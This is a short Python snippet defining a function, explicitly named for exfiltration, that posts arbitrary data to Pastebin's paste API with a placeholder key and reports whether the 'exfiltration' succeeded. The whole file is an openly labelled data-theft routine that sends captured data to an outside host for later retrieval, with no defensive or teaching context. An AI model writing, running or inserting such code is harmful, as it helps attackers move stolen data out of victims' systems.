import requests

def exfiltrate_to_text_storage(data):
    url = 'https://pastebin.com/api/api_post.php'
    api_key = 'your_api_key'
    
    data = {
        'api_dev_key': api_key,
        'api_option': 'paste',
        'api_paste_code': data
    }

    response = requests.post(url, data=data)
    
    if response.status_code == 200:
        print("Exfiltration successful")
    else:
        print("Exfiltration failed")